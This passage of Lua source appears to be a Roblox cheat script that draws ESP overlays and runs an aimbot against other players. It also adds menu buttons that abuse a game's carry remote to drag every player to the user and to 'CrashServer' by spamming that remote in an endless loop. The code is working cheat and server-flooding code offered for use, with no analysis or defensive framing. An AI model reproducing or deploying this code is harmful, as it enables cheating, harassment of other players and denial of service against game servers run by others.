		Distance.TextSize = 12;
		Distance.Font = 2;
		Distance.TextColor3 = Color3.fromRGB(255, 255, 255);
		Distance.TextStrokeTransparency = 0;

		local HealthBackground = Instance.new("Frame", BoxHolder);
		HealthBackground.Visible = false;
		HealthBackground.BorderSizePixel = 1;
		HealthBackground.BorderColor3 = HyperEscape.esp.Box.OutlineColor;

		local HealthBar = Instance.new("Frame", BoxHolder);
		HealthBar.Visible = false;
		HealthBar.BorderSizePixel = 0;
		HealthBar.BackgroundColor3 = Color3.fromRGB(0, 255 ,0); 

		local Health = Instance.new("TextLabel", BoxHolder);
		Health.BackgroundTransparency = 1;
		if IsAlive(Player) then
			Health.Text = (IsArsenal and players[Player.Character.Name].NRPBS["Health"].Value or Player.Character.Humanoid.Health);
		end
		Health.Visible = false;
		Health.AnchorPoint = Vector2.new(0.5, 0.5);
		Health.TextSize = 12;
		Health.Font = 2;
		Health.TextColor3 = Color3.fromRGB(255, 255, 255);
		Health.TextStrokeTransparency = 0;

		-- Tracer 

		local TracerOutline = Instance.new("Frame", TracerHolder);
		TracerOutline.BackgroundColor3 = HyperEscape.esp.Tracer.OutlineColor;
		TracerOutline.Visible = false;
		TracerOutline.BorderSizePixel = 1;
		TracerOutline.AnchorPoint = Vector2.new(0.5, 0.5);

		local Tracer = Instance.new("Frame", TracerHolder);
		Tracer.BackgroundColor3 = HyperEscape.esp.Tracer.Color;
		Tracer.Visible = false;
		Tracer.BorderSizePixel = 0;
		Tracer.AnchorPoint = Vector2.new(0.5, 0.5);

		-- Hilight

		local Hilight = Instance.new("Highlight", HilightHolder); 
		Hilight.Enabled = false;

		local co = coroutine.create(function()
			game:GetService("RunService").RenderStepped:Connect(function()
				if IsAlive(Player) and (HyperEscape.esp.Box.Box or HyperEscape.esp.Box.HealthBar or HyperEscape.esp.Box.Name or HyperEscape.esp.Box.Health or HyperEscape.esp.Tracer.Tracer or HyperEscape.esp.Hilights.Hilights) then
					local screen, onScreen = CurrentCamera:WorldToScreenPoint(Player.Character.HumanoidRootPart.Position); 
					local frustumHeight = math.tan(math.rad(CurrentCamera.FieldOfView * 0.5)) * 2 * screen.Z ; 
					local size = CurrentCamera.ViewportSize.Y / frustumHeight * HyperEscape.esp.CharacterSize;
					local position = Vector2.new(screen.X, screen.Y) - (size / 2 - Vector2.new(0, size.Y) / 20);

					if onScreen and (HyperEscape.esp.TeamCheck ~= true  or GetTeam(Player) ~= GetTeam(localPlayer)) and HyperEscape.esp.Enabled then	
						local DistanceNumb = math.floor(0.5+(CurrentCamera.CFrame.Position - Player.Character.HumanoidRootPart.Position).magnitude);
						if HyperEscape.esp.MaxDistance > DistanceNumb then
							-- Box

							if HyperEscape.esp.Box.Box then

								LeftOutline.Visible = HyperEscape.esp.Box.Box and HyperEscape.esp.Box.Outline;
								RightOutline.Visible =  HyperEscape.esp.Box.Box and HyperEscape.esp.Box.Outline;
								TopOutline.Visible =  HyperEscape.esp.Box.Box and HyperEscape.esp.Box.Outline;
								BottomOutline.Visible =  HyperEscape.esp.Box.Box and HyperEscape.esp.Box.Outline;

								Left.Position = UDim2.fromOffset(position.X, position.Y);
								Right.Position = UDim2.fromOffset(position.X, position.Y + size.Y - 1);
								Top.Position = UDim2.fromOffset(position.X, position.Y);
								Bottom.Position = UDim2.fromOffset(position.X + size.X - 1, position.Y);

								LeftOutline.Position = Left.Position;
								RightOutline.Position =  Right.Position;
								TopOutline.Position =  Top.Position;
								BottomOutline.Position =  Bottom.Position;

								Left.Visible = HyperEscape.esp.Box.Box;
								Right.Visible =  HyperEscape.esp.Box.Box;
								Top.Visible =  HyperEscape.esp.Box.Box;
								Bottom.Visible =  HyperEscape.esp.Box.Box;

								Left.Size = UDim2.fromOffset(size.X, 1);
								Right.Size = UDim2.fromOffset(size.X, 1);
								Top.Size = UDim2.fromOffset(1, size.Y);
								Bottom.Size = UDim2.fromOffset(1, size.Y);

								LeftOutline.Size = Left.Size;
								RightOutline.Size = Right.Size;
								TopOutline.Size = Top.Size;
								BottomOutline.Size = Bottom.Size;

								LeftOutline.BorderColor3 = HyperEscape.esp.Box.OutlineColor;
								RightOutline.BorderColor3 =  HyperEscape.esp.Box.OutlineColor;
								TopOutline.BorderColor3 =  HyperEscape.esp.Box.OutlineColor;
								BottomOutline.BorderColor3 =  HyperEscape.esp.Box.OutlineColor;

								Left.BackgroundColor3 = HyperEscape.esp.Box.Color;
								Right.BackgroundColor3 = HyperEscape.esp.Box.Color;
								Top.BackgroundColor3 = HyperEscape.esp.Box.Color;
								Bottom.BackgroundColor3 = HyperEscape.esp.Box.Color;
								LeftOutline.BackgroundColor3 = HyperEscape.esp.Box.Color;
								RightOutline.BackgroundColor3 = HyperEscape.esp.Box.Color;
								TopOutline.BackgroundColor3 = HyperEscape.esp.Box.Color;
								BottomOutline.BackgroundColor3 = HyperEscape.esp.Box.Color;
							else
								LeftOutline.Visible = false;
								RightOutline.Visible =  false;
								TopOutline.Visible =  false;
								BottomOutline.Visible =  false;
								Left.Visible = false;
								Right.Visible =  false;
								Top.Visible =  false;
								Bottom.Visible =  false;
							end

							if HyperEscape.esp.Box.HealthBar then

								local health = (IsArsenal and players[Player.Character.Name].NRPBS["Health"].Value or Player.Character.Humanoid.Health);
								local healthScale = (IsArsenal and health / players[Player.Character.Name].NRPBS["MaxHealth"].Value or health / Player.Character.Humanoid.MaxHealth);
								local healthSizeY = size.Y * healthScale;

								HealthBackground.Visible = HyperEscape.esp.Box.HealthBar;
								HealthBar.Visible = HyperEscape.esp.Box.HealthBar;

								HealthBackground.Size = UDim2.fromOffset(4, size.Y);
								HealthBar.Size = UDim2.fromOffset(2, -healthSizeY);

								HealthBackground.Position = UDim2.fromOffset(position.X - 8, position.Y); 
								HealthBar.Position = UDim2.fromOffset(position.x - 7, position.y + size.Y);

								HealthBackground.BackgroundColor3 = HyperEscape.esp.Box.OutlineColor;
								HealthBackground.BorderColor3 = HyperEscape.esp.Box.OutlineColor;
							else
								HealthBackground.Visible = false;
								HealthBar.Visible = false;
							end

							if HyperEscape.esp.Box.Health then

								local health = (IsArsenal and players[Player.Character.Name].NRPBS["Health"].Value or Player.Character.Humanoid.Health);
								local healthScale = (IsArsenal and health / players[Player.Character.Name].NRPBS["MaxHealth"].Value or health / Player.Character.Humanoid.MaxHealth);
								local healthSizeY = size.Y * healthScale;

								Health.Visible = HyperEscape.esp.Box.Health;

								Health.Position = (HyperEscape.esp.Box.HealthBar and UDim2.fromOffset(position.X - 25, position.y + size.Y + -healthSizeY) or UDim2.fromOffset(position.X - 25, position.Y + size.Y));

								Health.Text = (IsArsenal and math.floor(players[Player.Character.Name].NRPBS["Health"].Value) or math.floor(Player.Character.Humanoid.Health));
							else
								Health.Visible = false;
							end

							-- Distance

							if HyperEscape.esp.Box.Distance or HyperEscape.esp.Box.Name then

								Name.Visible = HyperEscape.esp.Box.Name;
								Distance.Visible = HyperEscape.esp.Box.Distance and not HyperEscape.esp.Box.Name;

								Name.Position = UDim2.fromOffset(screen.X, screen.Y - (size.Y + Name.TextBounds.Y + 14) / 2);
								Distance.Position = UDim2.fromOffset(screen.X, screen.Y - (size.Y + Name.TextBounds.Y + 14) / 2);

								Distance.Text = math.floor(0.5+(CurrentCamera.CFrame.Position - Player.Character.HumanoidRootPart.Position).magnitude);
								Name.Text = (HyperEscape.esp.Box.Name and HyperEscape.esp.Box.Distance and Player.Name .. " [" .. math.floor(0.5+(CurrentCamera.CFrame.Position - Player.Character.HumanoidRootPart.Position).magnitude / 3.5714285714) .. "]" or Player.Name);

							else
								Name.Visible = false;
								Distance.Visible = false;
							end

							-- Tracer

							if HyperEscape.esp.Tracer.Tracer then

								local ScreenVec2 = Vector2.new(screen.X, screen.Y + size.Y / 2 + size.Y / 20);
								local Origin = Vector2.new(CurrentCamera.ViewportSize.X/2, CurrentCamera.ViewportSize.Y - 1);
								local TracerPosition = (Origin + ScreenVec2) / 2;

								TracerOutline.Visible = HyperEscape.esp.Tracer.Outline and HyperEscape.esp.Tracer.Tracer;
								Tracer.Visible = HyperEscape.esp.Tracer.Tracer;

								Tracer.Rotation = math.deg(math.atan2(ScreenVec2.Y - Origin.Y, ScreenVec2.X - Origin.X));
								Tracer.Position = UDim2.new(0, TracerPosition.X, 0, TracerPosition.Y);
								Tracer.Size = UDim2.fromOffset((Origin - ScreenVec2).Magnitude, 1);

								TracerOutline.Rotation = Tracer.Rotation;
								TracerOutline.Position = Tracer.Position;
								TracerOutline.Size = Tracer.Size;

								TracerOutline.BorderColor3 = HyperEscape.esp.Tracer.OutlineColor;
								Tracer.BackgroundColor3 = HyperEscape.esp.Tracer.Color;

							else
								TracerOutline.Visible = false;
								Tracer.Visible = false;
							end

							-- Hilight 

							if HyperEscape.esp.Hilights.Hilights then

								Hilight.Enabled = HyperEscape.esp.Hilights.Hilights;

								if not IsArsenal then
									Hilight.Adornee = Player.Character;
								end

								Hilight.OutlineColor = HyperEscape.esp.Hilights.OutlineColor;
								Hilight.FillColor = HyperEscape.esp.Hilights.FillColor;

								Hilight.FillTransparency = HyperEscape.esp.Hilights.FillTransparency;
								Hilight.OutlineTransparency = HyperEscape.esp.Hilights.OutlineTransparency;

								Hilight.DepthMode = (HyperEscape.esp.Hilights.AllWaysVisible and "AlwaysOnTop" or not HyperEscape.esp.Hilights.AllWaysVisible and "Occluded");
							else
								Hilight.Enabled = false;
								Hilight.Adornee = nil;
							end

						else
							LeftOutline.Visible = false;
							RightOutline.Visible =  false;
							TopOutline.Visible =  false;
							BottomOutline.Visible =  false;
							Left.Visible = false;
							Right.Visible =  false;
							Top.Visible =  false;
							Bottom.Visible =  false;
							TracerOutline.Visible = false;
							Tracer.Visible = false;
							Name.Visible = false;
							Distance.Visible = false;
							HealthBackground.Visible = false;
							HealthBar.Visible = false;
							Health.Visible = false;	
							Hilight.Enabled = false;
							Hilight.Adornee = nil;
						end
					else
						LeftOutline.Visible = false;
						RightOutline.Visible =  false;
						TopOutline.Visible =  false;
						BottomOutline.Visible =  false;
						Left.Visible = false;
						Right.Visible =  false;
						Top.Visible =  false;
						Bottom.Visible =  false;
						TracerOutline.Visible = false;
						Tracer.Visible = false;
						Name.Visible = false;
						Distance.Visible = false;
						HealthBackground.Visible = false;
						HealthBar.Visible = false;
						Health.Visible = false;	
						Hilight.Enabled = false;
						Hilight.Adornee = nil;
					end

				else
					LeftOutline.Visible = false;
					RightOutline.Visible =  false;
					TopOutline.Visible =  false;
					BottomOutline.Visible =  false;
					Left.Visible = false;
					Right.Visible =  false;
					Top.Visible =  false;
					Bottom.Visible =  false;
					TracerOutline.Visible = false;
					Tracer.Visible = false;
					Name.Visible = false;
					Distance.Visible = false;
					HealthBackground.Visible = false;
					HealthBar.Visible = false;
					Health.Visible = false;
					Hilight.Enabled = false;
					Hilight.Adornee = nil;
				end
			end)
			if not players:FindFirstChild(Player.Name) then
				PlayerESP:Destroy()
				coroutine.yield()
			end
		end)
		coroutine.resume(co)
	end


	for i,plr in pairs(players:GetChildren()) do
		if plr ~= localPlayer then
			LoadESP(plr);
		end
	end

	players.PlayerAdded:Connect(function(plr)
		if plr ~= localPlayer then
			LoadESP(plr);
		end
	end)




	UIS.InputBegan:Connect(function(Key)
		if Key.KeyCode == HyperEscape.AimBot.Keybind and not HyperEscape.AimBot.UseMouse then
			HyperEscape.AimBot.Target = CameraGetClosestToMouse();
			HyperEscape.AimBot.IsAimKeyDown = true;
		end
	end)
	UIS.InputEnded:Connect(function(Key)
		if Key.KeyCode == HyperEscape.AimBot.Keybind and not HyperEscape.AimBot.UseMouse then
			HyperEscape.AimBot.Target = CameraGetClosestToMouse();
			HyperEscape.AimBot.IsAimKeyDown = false;
			if HyperEscape.AimBot.CameraTween ~= nil then
				HyperEscape.AimBot.CameraTween:Cancel();
			end
		end
	end)

	localPlayer:GetMouse().Button1Down:Connect(function(Key)
		if HyperEscape.AimBot.MouseBind == "MouseButton1" and HyperEscape.AimBot.UseMouse then
			if HyperEscape.AimBot.IsAimKeyDown then
				HyperEscape.AimBot.Target = CameraGetClosestToMouse();
				HyperEscape.AimBot.IsAimKeyDown = false;
				if HyperEscape.AimBot.CameraTween ~= nil then
					HyperEscape.AimBot.CameraTween:Cancel();
				end
			else
				HyperEscape.AimBot.Target = CameraGetClosestToMouse();
				HyperEscape.AimBot.IsAimKeyDown = true;
			end
		end
	end)
	localPlayer:GetMouse().Button1Up:Connect(function(Key)
		if HyperEscape.AimBot.MouseBind == "MouseButton1" and HyperEscape.AimBot.UseMouse then
			HyperEscape.AimBot.Target = CameraGetClosestToMouse();
			HyperEscape.AimBot.IsAimKeyDown = false;
			if HyperEscape.AimBot.CameraTween ~= nil then
				HyperEscape.AimBot.CameraTween:Cancel();
			end
		end
	end)

	localPlayer:GetMouse().Button2Down:Connect(function(Key)
		if HyperEscape.AimBot.MouseBind == "MouseButton2" and HyperEscape.AimBot.UseMouse then
			HyperEscape.AimBot.Target = CameraGetClosestToMouse();
			HyperEscape.AimBot.IsAimKeyDown = true;
		end
	end)
	localPlayer:GetMouse().Button2Up:Connect(function(Key)
		if HyperEscape.AimBot.MouseBind == "MouseButton2" and HyperEscape.AimBot.UseMouse then
			HyperEscape.AimBot.Target = CameraGetClosestToMouse();
			HyperEscape.AimBot.IsAimKeyDown = false;
			if HyperEscape.AimBot.CameraTween ~= nil then
				HyperEscape.AimBot.CameraTween:Cancel();
			end
		end
	end)

	game:GetService("RunService").Heartbeat:Connect(function() 

		if HyperEscape.AimBot.Enabled and HyperEscape.AimBot.ShowFov then
			UIStroke.Enabled = true;
			UIStroke.Color = HyperEscape.AimBot.FovColor;

			local posd = UIS:GetMouseLocation();
			FOVFFrame.Position = UDim2.new(0, posd.X, 0, posd.Y - 36);
			FOVFFrame.Size = UDim2.fromOffset(HyperEscape.AimBot.Fov * 1.5, HyperEscape.AimBot.Fov * 1.5);
		else
			UIStroke.Enabled = false;
		end

		if HyperEscape.AimBot.Enabled then
			if HyperEscape.AimBot.IsAimKeyDown then
				if HyperEscape.AimBot.StickyAim then
					if HyperEscape.AimBot.Target ~= nil then

						if not IsAlive(HyperEscape.AimBot.Target) then -- Yes I Know This Aim Bot Sucks
							local target = CameraGetClosestToMouse()
							HyperEscape.AimBot.Target = target;
							HyperEscape.AimBot.CameraTween = TweenService:Create(CurrentCamera, TweenInfo.new(HyperEscape.AimBot.Smoothing, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {CFrame = CFrame.new(CurrentCamera.CFrame.Position, target.Character[HyperEscape.AimBot.AimPart].Position + (HyperEscape.AimBot.Prediction and HyperEscape.AimBot.target.Character[HyperEscape.AimBot.AimPart].Velocity * (localPlayer:GetNetworkPing() * HyperEscape.AimBot.PredictionAmmount) or Vector3.new()))});
							HyperEscape.AimBot.CameraTween:Play();
						end
						HyperEscape.AimBot.CameraTween = TweenService:Create(CurrentCamera, TweenInfo.new(HyperEscape.AimBot.Smoothing, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {CFrame = CFrame.new(CurrentCamera.CFrame.Position, HyperEscape.AimBot.Target.Character[HyperEscape.AimBot.AimPart].Position + (HyperEscape.AimBot.Prediction and HyperEscape.AimBot.Target.Character[HyperEscape.AimBot.AimPart].Velocity * (localPlayer:GetNetworkPing() * HyperEscape.AimBot.PredictionAmmount) or Vector3.new()))});
						HyperEscape.AimBot.CameraTween:Play();
					end
				else
					local target = CameraGetClosestToMouse();
					if target ~= nil then
						HyperEscape.AimBot.CameraTween = TweenService:Create(CurrentCamera, TweenInfo.new(HyperEscape.AimBot.Smoothing, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {CFrame = CFrame.new(CurrentCamera.CFrame.Position,  target.Character[HyperEscape.AimBot.AimPart].Position + (HyperEscape.AimBot.Prediction and target.Character[HyperEscape.AimBot.AimPart].Velocity * (localPlayer:GetNetworkPing() * HyperEscape.AimBot.PredictionAmmount) or Vector3.new()))});
						HyperEscape.AimBot.CameraTween:Play();

					elseif HyperEscape.AimBot.CameraTween ~= nil then
						HyperEscape.AimBot.CameraTween:Cancel(); 
					end
				end
			end
		end
	end)
end)

local function addMainMenuButton(text, callback)
	local panel = allTabPanels["BRING MENU"]
	if not panel then return end
	local btn = new("TextButton", {
		Size = UDim2.new(1, -16, 0, 38),
		BackgroundColor3 = Color3.fromRGB(245,245,245),
		TextColor3 = Color3.new(0,0,0),
		Font = Enum.Font.Roboto,
		TextSize = 14,
		Text = text,
		AutoButtonColor = false,
		Parent = panel,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})

	btn.MouseEnter:Connect(function()
		local t = getThemeColors()
		local accent = t.accent or Color3.new(1,1,1)
		local hover = t.bg:Lerp(accent, 0.50)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = hover}):Play()
	end)
	btn.MouseLeave:Connect(function()
		local t = getThemeColors()
		local accent = t.accent or Color3.new(1,1,1)
		local base = t.bg:Lerp(accent, 0.32)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = base}):Play()
	end)

	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 4 Buttons in Roleplay Script
addMainMenuButton("CARRY SYSTEM BRING ALL 1 (MONSY)", function()
	local player = game.Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

-- Setup UI
local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
screenGui.Name = ""
screenGui.ResetOnSpawn = false

local frame = Instance.new("Frame")
frame.Name = ""
frame.Size = UDim2.new(0, 300, 0, 150)
frame.Position = UDim2.new(0.5, -150, 0.5, -75)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

local titleLabel = Instance.new("TextLabel")
titleLabel.Text = "PUBLIC ENEMY CMD"
titleLabel.Font = Enum.Font.Roboto
titleLabel.TextColor3 = Color3.fromRGB(0,0,0) -- White na
titleLabel.TextSize = 16
titleLabel.BackgroundTransparency = 1
titleLabel.Size = UDim2.new(1, 0, 0, 20)
titleLabel.Position = UDim2.new(0, 0, 0, 5)
titleLabel.Parent = frame

local textBox = Instance.new("TextBox")
textBox.Name = ""
textBox.Text = ""
textBox.PlaceholderText = "Enter Command (3KTG)"
textBox.Font = Enum.Font.Roboto
textBox.TextColor3 = Color3.fromRGB(0,0,0)
textBox.TextSize = 24
textBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
textBox.BorderSizePixel = 0
textBox.Size = UDim2.new(0.9, 0, 0, 40)
textBox.Position = UDim2.new(0.05, 0, 0, 40)
textBox.ClearTextOnFocus = false
textBox.Parent = frame

local toggleButton = Instance.new("TextButton")
toggleButton.Text = "OFF"
toggleButton.Font = Enum.Font.Roboto
toggleButton.TextColor3 = Color3.fromRGB(0,0,0) -- White when OFF
toggleButton.TextSize = 22
toggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggleButton.BorderSizePixel = 0
toggleButton.Size = UDim2.new(0.6, 0, 0, 35)
toggleButton.Position = UDim2.new(0.2, 0, 0, 95)
toggleButton.Parent = frame

-- Carry variables
local carryRemote = ReplicatedStorage:WaitForChild("CarryReplic"):WaitForChild("CarryRemotes"):WaitForChild("CarryRemote")
local carryChoice = ReplicatedStorage:WaitForChild("CarryReplic"):WaitForChild("CarryChoices"):WaitForChild("Couple Hug")

-- Command functions
local commands = {}

commands["BringAll"] = function()
	for _, plr in pairs(Players:GetPlayers()) do
		if plr ~= player then
			carryRemote:FireServer({
				cmd = "Carry",
				carrychoicesss = carryChoice,
				firstPlr = plr
			})
		end
	end
	wait(0.03)
	carryRemote:FireServer({ cmd = "Declinecarry" })
end

commands["BringRandom"] = function()
	local others = {}
	for _, plr in pairs(Players:GetPlayers()) do
		if plr ~= player then
			table.insert(others, plr)
		end
	end
	if #others > 0 then
		local rand = others[math.random(1, #others)]
		carryRemote:FireServer({
			cmd = "Carry",
			carrychoicesss = carryChoice,
			firstPlr = rand
		})
		wait(0.03)
		carryRemote:FireServer({ cmd = "Declinecarry" })
	end
end

commands["CrashServer"] = function()
	while true do
		for _, plr in pairs(Players:GetPlayers()) do
			if plr ~= player then
				carryRemote:FireServer({
					cmd = "Carry",
					carrychoicesss = carryChoice,
					firstPlr = plr
				})
			end
		end
		carryRemote:FireServer({ cmd = "Declinecarry" })
		task.wait()
	end
end

commands["Secret"] = function()
	local chatService = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
	chatService:FireServer("MONSY BALABAGKUMANTOT", "All")
end

-- Toggle logic
local isOn = false

toggleButton.MouseButton1Click:Connect(function()
	isOn = not isOn
	if isOn then
		toggleButton.Text = "ON"
		toggleButton.TextColor3 = Color3.fromRGB(0,0,0) -- Green ON
		local cmdText = textBox.Text
		local commandFunc = commands[cmdText]
		if commandFunc then
			commandFunc()
		else
			warn("Unknown command: " .. cmdText)
		end
	else
		toggleButton.Text = "OFF"
		toggleButton.TextColor3 = Color3.fromRGB(0,0,0) -- White OFF
	end
end)
end)

addMainMenuButton("CARRY SYSTEM BRING ALL 2 (MONSY)", function()
	local player = game.Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

-- Setup UI
local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
screenGui.Name = ""
screenGui.ResetOnSpawn = false

local frame = Instance.new("Frame")
frame.Name = ""
frame.Size = UDim2.new(0, 300, 0, 150)
frame.Position = UDim2.new(0.5, -150, 0.5, -75)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

local titleLabel = Instance.new("TextLabel")
titleLabel.Text = "PUBLIC ENEMY CMD"
titleLabel.Font = Enum.Font.Roboto
titleLabel.TextColor3 = Color3.fromRGB(0,0,0) -- Changed from red to white
titleLabel.TextSize = 16
titleLabel.BackgroundTransparency = 1
titleLabel.Size = UDim2.new(1, 0, 0, 20)
titleLabel.Position = UDim2.new(0, 0, 0, 5)
titleLabel.Parent = frame

local textBox = Instance.new("TextBox")
textBox.Name = ""
textBox.Text = ""
textBox.PlaceholderText = "Enter Command (3KTG)"
textBox.Font = Enum.Font.Roboto
textBox.TextColor3 = Color3.fromRGB(0,0,0)
textBox.TextSize = 24
textBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
textBox.BorderSizePixel = 0
textBox.Size = UDim2.new(0.9, 0, 0, 40)
textBox.Position = UDim2.new(0.05, 0, 0, 40)
textBox.ClearTextOnFocus = false
textBox.Parent = frame

local toggleButton = Instance.new("TextButton")
toggleButton.Text = "OFF"
toggleButton.Font = Enum.Font.Roboto
toggleButton.TextColor3 = Color3.fromRGB(0,0,0) -- Changed from red to white
toggleButton.TextSize = 22
toggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggleButton.BorderSizePixel = 0
toggleButton.Size = UDim2.new(0.6, 0, 0, 35)
toggleButton.Position = UDim2.new(0.2, 0, 0, 95)
toggleButton.Parent = frame

-- Carry variables
local carryRemote = ReplicatedStorage:WaitForChild("CarryReplic"):WaitForChild("CarryRemotes"):WaitForChild("CarryRemote")
local carryChoice = ReplicatedStorage:WaitForChild("CarryReplic"):WaitForChild("CarryChoices"):WaitForChild("Pabuhat")

-- Command functions
local commands = {}

commands["BringAll"] = function()
	for _, plr in pairs(Players:GetPlayers()) do
		if plr ~= player then
			carryRemote:FireServer({
				cmd = "Carry",
				carrychoicesss = carryChoice,
				firstPlr = plr
			})
		end
	end
	wait(0.07)
	carryRemote:FireServer({ cmd = "Declinecarry" })
end

commands["BringRandom"] = function()
	local others = {}
	for _, plr in pairs(Players:GetPlayers()) do
		if plr ~= player then
			table.insert(others, plr)
		end
	end
	if #others > 0 then
		local rand = others[math.random(1, #others)]
		carryRemote:FireServer({
			cmd = "Carry",
			carrychoicesss = carryChoice,
			firstPlr = rand
		})
		wait(0.07)
		carryRemote:FireServer({ cmd = "Declinecarry" })
	end
end

commands["CrashServer"] = function()
	while true do
		for _, plr in pairs(Players:GetPlayers()) do
			if plr ~= player then
				carryRemote:FireServer({
					cmd = "Carry",
					carrychoicesss = carryChoice,
					firstPlr = plr
				})
			end
		end
		carryRemote:FireServer({ cmd = "Declinecarry" })
		task.wait()
	end
end

commands["Secret"] = function()
	local chatService = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
	chatService:FireServer("MONSY BALABAGKUMANTOT", "All")
end

-- Toggle logic
local isOn = false

toggleButton.MouseButton1Click:Connect(function()
	isOn = not isOn
	if isOn then
		toggleButton.Text = "ON"
		toggleButton.TextColor3 = Color3.fromRGB(0,0,0)
		local cmdText = textBox.Text
		local commandFunc = commands[cmdText]
		if commandFunc then
			commandFunc()
		else
			warn("Unknown command: " .. cmdText)
		end
	else
		toggleButton.Text = "OFF"
		toggleButton.TextColor3 = Color3.fromRGB(0,0,0) -- Changed OFF color to white
	end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CARRY SYSTEM BRING ALL (VERSION 3)", function()
	local player = game.Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

-- Setup UI
local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
screenGui.Name = ""
screenGui.ResetOnSpawn = false

local frame = Instance.new("Frame")
frame.Name = ""
frame.Size = UDim2.new(0, 300, 0, 270)
frame.Position = UDim2.new(0.5, -150, 0.5, -135)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

local titleLabel = Instance.new("TextLabel")
titleLabel.Text = "BRING ALL SYSTEM"
titleLabel.Font = Enum.Font.Roboto
titleLabel.TextColor3 = Color3.fromRGB(0,0,0)
titleLabel.TextSize = 16
titleLabel.BackgroundTransparency = 1
titleLabel.Size = UDim2.new(1, 0, 0, 20)
titleLabel.Position = UDim2.new(0, 0, 0, 5)
titleLabel.Parent = frame

-- Helper to create black button with white text
local function createButton(name, text, yPos)
	local button = Instance.new("TextButton")
	button.Name = name
	button.Text = text
	button.Font = Enum.Font.Roboto
	button.TextColor3 = Color3.fromRGB(0,0,0)
	button.TextSize = 14
	button.BackgroundColor3 = Color3.fromRGB(255,255,255)
	button.BorderSizePixel = 0
	button.Size = UDim2.new(0.9, 0, 0, 35)
	button.Position = UDim2.new(0.05, 0, 0, yPos)
	Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)
	button.Parent = frame
	return button
end

-- Create Buttons
local bringAllButton = createButton("BringAllButton", "BringAll", 35)
local bringRandomButton = createButton("BringRandomButton", "BringRandom", 80)
local crashServerButton = createButton("CrashServerButton", "CrashServer", 125)

-- Username TextBox
local textBox = Instance.new("TextBox")
textBox.Name = ""
textBox.Text = ""
textBox.PlaceholderText = "Enter Username"
textBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
textBox.Font = Enum.Font.Roboto
textBox.TextColor3 = Color3.fromRGB(0,0,0)
textBox.TextSize = 14
textBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
textBox.BorderSizePixel = 0
textBox.Size = UDim2.new(0.9, 0, 0, 35)
textBox.Position = UDim2.new(0.05, 0, 0, 170)
textBox.ClearTextOnFocus = false
textBox.Parent = frame
Instance.new("UICorner", textBox).CornerRadius = UDim.new(0, 6)

-- Execute Button
local executeButton = createButton("ExecuteButton", "EXECUTE", 215)

-- Carry variables
local carryRemote = ReplicatedStorage:WaitForChild("CarryReplic"):WaitForChild("CarryRemotes"):WaitForChild("CarryRemote")
local carryChoice = ReplicatedStorage:WaitForChild("CarryReplic"):WaitForChild("CarryChoices")["Couple Hug"]

-- Command functions
local commands = {}

commands["BringAll"] = function()
	for _, plr in pairs(Players:GetPlayers()) do
		if plr ~= player then
			carryRemote:FireServer({
				cmd = "Carry",
				carrychoicesss = carryChoice,
				firstPlr = plr
			})
		end
	end
	wait(0.02)
	carryRemote:FireServer({ cmd = "Declinecarry" })
end

commands["BringRandom"] = function()
	local others = {}
	for _, plr in pairs(Players:GetPlayers()) do
		if plr ~= player then
			table.insert(others, plr)
		end
	end
	if #others > 0 then
		local rand = others[math.random(1, #others)]
		carryRemote:FireServer({
			cmd = "Carry",
			carrychoicesss = carryChoice,
			firstPlr = rand
		})
		wait(0.02)
		carryRemote:FireServer({ cmd = "Declinecarry" })
	end
end

commands["CrashServer"] = function()
	while true do
		for _, plr in pairs(Players:GetPlayers()) do
			if plr ~= player then
				carryRemote:FireServer({
					cmd = "Carry",
					carrychoicesss = carryChoice,
					firstPlr = plr
				})
			end
		end
		carryRemote:FireServer({ cmd = "Declinecarry" })
		task.wait(5)
	end
end

-- Button connections
bringAllButton.MouseButton1Click:Connect(commands["BringAll"])
bringRandomButton.MouseButton1Click:Connect(commands["BringRandom"])
crashServerButton.MouseButton1Click:Connect(commands["CrashServer"])

-- Execute button logic (EXACT NAME, uses "Dragging Carry ")
executeButton.MouseButton1Click:Connect(function()
	local inputText = textBox.Text:match("^%s*(.-)%s*$") -- trim
	if inputText == "" then
		warn("Please enter a username.")
		return
	end

	local target = Players:FindFirstChild(inputText)
	if target and target ~= player then
		carryRemote:FireServer({
			cmd = "Carry",
			firstPlr = target,
			carrychoicesss = ReplicatedStorage.CarryReplic.CarryChoices["Couple Hug"]
		})
	else
		warn("Player '" .. inputText .. "' not found in server.")
	end
end)
end)

local function addMainMenuButton(text, callback)
	local panel = allTabPanels["AIMBOT MENU"]
	if not panel then return end
	local btn = new("TextButton", {
